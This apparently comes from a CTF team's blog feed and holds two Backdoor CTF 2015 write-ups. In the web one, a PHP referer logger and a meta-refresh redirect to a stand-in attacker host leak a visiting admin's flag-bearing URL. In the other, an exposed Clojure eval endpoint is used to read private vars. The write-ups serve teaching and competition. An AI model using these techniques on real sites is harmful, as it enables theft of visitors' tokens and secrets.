<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[GeeksSpeak Team Blog]]></title>
  <link href="http://geeksspeak.github.io/atom.xml" rel="self"/>
  <link href="http://geeksspeak.github.io/"/>
  <updated>2015-04-03T01:14:17+04:30</updated>
  <id>http://geeksspeak.github.io/</id>
  <author>
    <name><![CDATA[GeeksSpeak]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Backdoor CTF 2015 - Medusa Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-medusa-writeup/"/>
    <updated>2015-04-03T01:06:09+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-medusa-writeup</id>
    <content type="html"><![CDATA[<p><strong>Backdoor2015 Medusa Writeup</strong><br/>
<strong>Point = 100</strong><br/>
<strong>Category = Web</strong><br/>
<strong>Description : </strong></p>

<blockquote><p>The html page you create will be visited by the backdoor admin with the flag.
You can enter a fake flag to simulate the challenge.</p>

<p>Get the flag at <a href="http://hack.bckdr.in/MEDUSA/">http://hack.bckdr.in/MEDUSA/</a></p></blockquote>

<p>After We open the link that is provided in description we are welcomed with a form.you can send message with html code and after that admin will visit your page with the flag.</p>

<p><img src="http://up.ashiyane.org/images/nxcfynwxymxjqi2v4u7.png" title="Medusa Form" alt="alt text" /></p>

<p>Backdoor CTF admin add a hint and mention that they sent flag as post request</p>

<p>this is sample request that admin sent :</p>

<p><a href="http://hack.bckdr.in/MEDUSA/view.php?id=ID&amp;flag=FLAG">http://hack.bckdr.in/MEDUSA/view.php?id=ID&amp;flag=FLAG</a></p>

<p>when you sent the message Medusa website create id for you.
you can visit your message with this id ( same as admin :D )</p>

<p><img src="http://up.ashiyane.org/images/wu0fm2e5n6shme48fj58.png" title="Message Read" alt="alt text" /></p>

<p>we test different method to get the flag value from post request with PHP or JavaScript in our page but we see error or blank page.</p>

<blockquote><p>after some investigation our team found answer !!!</p></blockquote>

<p>we can redirect admin to another page and get the flag</p>

<p>but if they sent request as post cant log the value in second page.so thinking to Referer attribute in the header.</p>

<p>write some code to get and save the Referer in the text file when admin redirect to our PHP page :
Server.php</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?php
</span><span class='line'>$ref = $_SERVER['HTTP_REFERER'];
</span><span class='line'>file_put_contents("flag.txt",$ref);
</span><span class='line'>?&gt;```
</span><span class='line'>
</span><span class='line'> &gt; and sent this code as our page to Medusa form :</span></code></pre></td></tr></table></div></figure>


<hr />

<h2>location: <a href="http://Attackerwebsite.com/server.php">http://Attackerwebsite.com/server.php</a></h2>

<p>Can you get the <strong>flag</strong>?</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>but after admin visit the link flag.txt is empty !!!
</span><span class='line'>
</span><span class='line'>no Referer sent to PHP page...
</span><span class='line'>
</span><span class='line'>we test several time ( for this challenge or local tests ) and same result,no Referer save in flag.txt
</span><span class='line'>
</span><span class='line'>after some research we found out with this kind of header redirection we cant get Referer and we should change that.
</span></code></pre></td></tr></table></div></figure>


<hr />

<h2>Refresh: 0; url=<a href="http://Attackerwebsite.com/server.php">http://Attackerwebsite.com/server.php</a></h2>

<p>Can you get the <strong>flag</strong>?</p>

<p>&#8220;`</p>

<p>and guess what?</p>

<blockquote><p>we have Referer Link in flag.txt :D</p></blockquote>

<p><a href="http://hack.bckdr.in/MEDUSA/view.php?flag=6bbaf4e1d3af423dd6c5a03c21c2a35c075392861709f2e896a27ae1f57d30c5&amp;id=d61d051c6e741595491c">Referer Link With Flag!</a></p>

<p>and now you have 100 point :D</p>

<p>WriteUp By Fr0nk</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Backdoor CTF 2015 - Noname Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-noname-writeup/"/>
    <updated>2015-04-03T00:42:36+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-noname-writeup</id>
    <content type="html"><![CDATA[<p><strong>Backdoor2015 NONAME Writeup</strong></p>

<p><strong>Point = 200</strong><br/>
<strong>Category = Exploit</strong><br/>
<strong>Description : </strong></p>

<blockquote><p>Intrestingly enough, even though it was not expected, Chintu found a cool website to play with, though he can&rsquo;t get the flag. Can you? Visit <a href="https://agile-garden-1672.herokuapp.com/">this</a>. Submit the SHA-256 hash of the flag obtained.</p>

<p>Welcome to Noname! You can see an intrepreter above
Get admin&rsquo;s flag and admin&rsquo;s secret. Remember admin is one of the people
Submit sha-256 of secret and flag joined
Get admin&rsquo;s flag and admin&rsquo;s secret. Remember admin is one of the people
Submit sha-256 of secret and flag joined</p></blockquote>

<p>We could see  see an intrepreter like this :
<img src="http://up.ashiyane.org/images/7f689wqyxbbwiaxbwl.png" alt="enter image description here" />
so first for testing script give &ldquo;1&rdquo; as input it will retrun &ldquo;1&rdquo; again ..
lets check whats going on in browser run firebug and check :</p>

<p><img src="http://up.ashiyane.org/images/2fmqsv03ko2qatsw10tq.png" alt="enter image description here" /></p>

<p>Its using JSON with eval.json at this <a href="https://agile-garden-1672.herokuapp.com/eval.json?expr=1">LINK</a> .
Lets see whats happen if we execute our codes directly :
<a href="https://agile-garden-1672.herokuapp.com/eval.json?expr=*">https://agile-garden-1672.herokuapp.com/eval.json?expr=*</a>
And the response :</p>

<blockquote><p>   {&ldquo;expr&rdquo;:&ldquo;*&rdquo;,&ldquo;result&rdquo;:&ldquo;#&lt;core$<em>STAR</em> clojure.core$<em>STAR</em>@5ca69ca5>&rdquo;}
 cool , Its Clojure and * is built-in function in &ldquo;clojure.core&rdquo;
 lets google clojure.core and find all functions of this library :
<a href="http://clojure.github.io/clojure/clojure.core-api.html">http://clojure.github.io/clojure/clojure.core-api.html</a>
this link has all built-in functions of this library . after little searching found (loaded-libs) function .
more googling about clojure i understood that for using function out syntax shoud be like
(function) . for loaded-libs it should be (loaded-libs) and response :</p>

<p>   {&ldquo;expr&rdquo;:&ldquo;(loaded-libs)&rdquo;,&ldquo;result&rdquo;:&ldquo;#{bultitude.core cheshire.core cheshire.factory cheshire.generate cheshire.parse clj-time.core clj-time.format clj-yaml.core clojail.core clojail.jvm clojail.testers clojure.core.cache clojure.core.incubator clojure.core.memoize clojure.data.priority-map clojure.java.io clojure.main clojure.repl clojure.set clojure.stacktrace clojure.string clojure.template clojure.test clojure.tools.macro clojure.tools.reader clojure.tools.reader.default-data-readers clojure.tools.reader.edn clojure.tools.reader.impl.ExceptionInfo clojure.tools.reader.impl.commons clojure.tools.reader.impl.utils clojure.tools.reader.reader-types clojure.walk clout.core compojure.core compojure.handler compojure.response compojure.route flatland.useful.fn flatland.useful.seq flatland.useful.utils hiccup.compiler hiccup.core hiccup.def hiccup.element hiccup.middleware hiccup.page hiccup.util noir.cookies noir.request noir.response noir.session noir.util.crypt noir.util.middleware noir.validation noname.models.eval noname.people.admin noname.server noname.views.eval noname.views.home ring.adapter.jetty ring.middleware.content-type ring.middleware.cookies ring.middleware.file-info ring.middleware.flash ring.middleware.format ring.middleware.format-params ring.middleware.format-response ring.middleware.head ring.middleware.keyword-params ring.middleware.multipart-params ring.middleware.multipart-params.temp-file ring.middleware.nested-params ring.middleware.params ring.middleware.session ring.middleware.session.memory ring.middleware.session.store ring.util.codec ring.util.io ring.util.mime-type ring.util.response ring.util.servlet ring.util.time serializable.fn}&rdquo;}</p></blockquote>

<p>Found good things :</p>

<pre><code>noname.models.eval noname.people.admin noname.server noname.views.eval noname.views.home
</code></pre>

<p>specialy &ldquo;noname.people.admin&rdquo; because of hint of question:</p>

<blockquote><p>Remember admin is one of the people</p></blockquote>

<p>Its loaded , so we can use it in our codes but we dont know functions and classes
little googling found &ldquo;clojure.repl/dir&rdquo; it can list classes , functions &hellip; :
<a href="https://agile-garden-1672.herokuapp.com/eval.json?expr=%28clojure.repl/dir%20noname.people.admin%29">https://agile-garden-1672.herokuapp.com/eval.json?expr=(clojure.repl/dir noname.people.admin)</a></p>

<p>and response :</p>

<blockquote><p>   {&ldquo;expr&rdquo;:&ldquo;(clojure.repl/dir noname.people.admin)&rdquo;,&ldquo;result&rdquo;:&ldquo;flag\nnil&rdquo;}</p></blockquote>

<p>oh . &ldquo;flag&rdquo; &hellip;. lets check if its public :
<a href="https://agile-garden-1672.herokuapp.com/eval.json?expr=%28print%20noname.people.admin/flag%29">https://agile-garden-1672.herokuapp.com/eval.json?expr=%28print%20noname.people.admin/flag%29</a></p>

<p> yes , its public , we can use it in interpreter :
<img src="http://up.ashiyane.org/images/b95z537owt2a0cmrm1ca.png" alt="enter image description here" /></p>

<p> got second part of flag :</p>

<pre><code>Give me some code:
</code></pre>

<blockquote><p>(noname.people.admin/flag)
Ma flag is : _b7w_1_l1k3_60l4n6_700nil</p></blockquote>

<p>We need first part of flag called admin&rsquo;s secret , let test  (noname.people.admin/secret)
and response id error :</p>

<blockquote><p>   {&ldquo;error&rdquo;:true,&ldquo;message&rdquo;:&ldquo;java.lang.IllegalStateException: var: noname.people.admin/secret is not public&rdquo;}</p></blockquote>

<p>it private , and because of namespace we cant use it also we cant switch our namespace becuase &ldquo;ns&rdquo; is closed by Java.Security&hellip;</p>

<p>lets google and find a way for bypass :)
found this <a href="http://christophermaier.name/blog/2011/04/30/not-so-private-clojure-functions">http://christophermaier.name/blog/2011/04/30/not-so-private-clojure-functions</a></p>

<p>awesome :D</p>

<p>do what it said :<br/>
<img src="http://up.ashiyane.org/images/lqo0cppgkh89dci505u1.png" alt="enter image description here" /></p>

<p>and its the first part of the flag :</p>

<blockquote><p>(#&lsquo;noname.people.admin/secret)
&ldquo;Ma secret is: 1_4m_50_cl0jur3d_y0u_c4n7_3v3n_7h1nk&rdquo;</p>

<p>Flag Format = sha256(secret+flag)
sha256(1_4m_50_cl0jur3d_y0u_c4n7_3v3n_7h1nk_b7w_1_l1k3_60l4n6_700)
<strong>147fadb708195779c6414a0ce9171bc4b966e03a9818383eabafa0e71a240d5a</strong></p></blockquote>

<p>200 points ;)</p>

<p>WriteUp By PARSA</p>
]]></content>
  </entry>
  
</feed>
